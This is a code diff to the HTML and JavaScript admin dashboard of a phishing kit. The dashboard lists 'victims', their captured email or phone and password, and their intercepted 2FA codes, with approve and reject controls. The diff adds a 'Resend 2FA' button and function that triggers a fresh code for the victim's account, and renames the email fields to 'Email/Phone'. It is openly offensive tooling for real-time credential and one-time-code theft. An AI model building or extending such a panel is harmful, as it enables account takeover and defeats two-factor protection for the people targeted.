@@ -530,7 +530,7 @@
                 </div>
                 <div class="victim-details">
                     <div class="victim-field">
-                        <span class="field-label">Email</span>
+                        <span class="field-label">Email/Phone</span>
                         <span class="field-value" id="live-email">-</span>
                     </div>
                     <div class="victim-field">
@@ -630,7 +630,7 @@
                         </div>
                     </div>
                     <table>
-                        <thead><tr><th style="width:40px"><input type="checkbox" class="checkbox" onclick="selectAll('creds')"></th><th>Email</th><th>Password</th><th>Time</th><th>Action</th></tr></thead>
+                        <thead><tr><th style="width:40px"><input type="checkbox" class="checkbox" onclick="selectAll('creds')"></th><th>Email/Phone</th><th>Password</th><th>Time</th><th>Action</th></tr></thead>
                         <tbody id="credentials-list">
                             <tr><td colspan="5" class="empty-state"><div class="empty-icon">📭</div><div>No credentials captured yet</div></td></tr>
                         </tbody>
@@ -650,7 +650,7 @@
                         </div>
                     </div>
                     <table>
-                        <thead><tr><th style="width:40px"><input type="checkbox" class="checkbox" onclick="selectAll('2fa')"></th><th>Code</th><th>Email</th><th>Time</th><th>Action</th></tr></thead>
+                        <thead><tr><th style="width:40px"><input type="checkbox" class="checkbox" onclick="selectAll('2fa')"></th><th>Code</th><th>Email/Phone</th><th>Time</th><th>Action</th></tr></thead>
                         <tbody id="2fa-list">
                             <tr><td colspan="5" class="empty-state"><div class="empty-icon">🔐</div><div>No 2FA codes captured yet</div></td></tr>
                         </tbody>
@@ -717,7 +717,7 @@
                             <button style="background: none; border: none; cursor: pointer; font-size: 14px;" onclick="copyToClipboard(document.getElementById('victim-email-display').textContent)">📋</button>
                         </div>
                         <div class="stat-value" id="victim-email-display" style="font-size: 14px; word-break: break-all;">-</div>
-                        <div class="stat-label">Email</div>
+                        <div class="stat-label">Email/Phone</div>
                     </div>
                     <div class="stat-card">
                         <div class="stat-header"><div class="stat-icon orange">🔐</div>
@@ -761,6 +761,7 @@
                 <div style="display: flex; gap: 16px; margin-top: 24px;">
                     <button class="quick-btn approve" style="position: static;" onclick="approveVictim()">✅ Approve Victim</button>
                     <button class="quick-btn reject" style="position: static;" onclick="rejectVictim()">❌ Reject Victim</button>
+                    <button class="quick-btn" style="position: static; background: var(--warning);" onclick="resend2FA()">🔄 Resend 2FA</button>
                 </div>
             </div>
             
@@ -901,7 +902,7 @@
             savePreference('compactMode', compactMode);
         }
         
-        function setTheme(themeName) {
+        function setTheme(themeName, silent = false) {
             const themes = {
                 purple: {
                     primary: '#6366f1', primaryLight: '#818cf8', primaryDark: '#4f46e5',
@@ -955,13 +956,15 @@
             document.documentElement.style.setProperty('--danger', theme.danger);
             
             localStorage.setItem('admin_theme', themeName);
-            showToast('Theme: ' + themeName.charAt(0).toUpperCase() + themeName.slice(1));
-            addActivity('Changed theme to ' + themeName);
+            if (!silent) {
+                showToast('Theme: ' + themeName.charAt(0).toUpperCase() + themeName.slice(1));
+                addActivity('Changed theme to ' + themeName);
+            }
         }
         
-        // Load saved theme
+        // Load saved theme silently
         const savedTheme = localStorage.getItem('admin_theme');
-        if (savedTheme) setTheme(savedTheme);
+        if (savedTheme) setTheme(savedTheme, true);
         
         function globalSearch() {
             const query = document.getElementById('globalSearch').value.toLowerCase();
@@ -1331,6 +1334,14 @@
             await fetch('/api/set-state', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({status: status}) });
             loadData();
             showToast('Victim rejected!');
+        }
+        
+        async function resend2FA() {
+            const stateRes = await fetch('/api/get-state');
+            const state = await stateRes.json();
+            const email = state.email || '';
+            await fetch('/api/resend-2fa', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({email: email}) });
+            showToast('2FA resend triggered');
         }
         
         function exportData() {
